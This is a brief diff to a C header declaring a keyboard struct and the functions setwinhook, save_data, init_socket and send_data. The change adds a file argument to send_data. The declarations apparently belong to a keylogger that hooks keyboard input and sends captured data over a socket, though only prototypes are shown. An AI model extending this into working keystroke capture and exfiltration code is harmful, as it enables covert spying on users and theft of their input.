@@ -19,4 +19,4 @@ struct keyboard
 void	setwinhook();
 void	save_data(const char*);
 SOCKET	init_socket(SOCKET);
-void	send_data(SOCKET);
+void	send_data(SOCKET, FILE*);
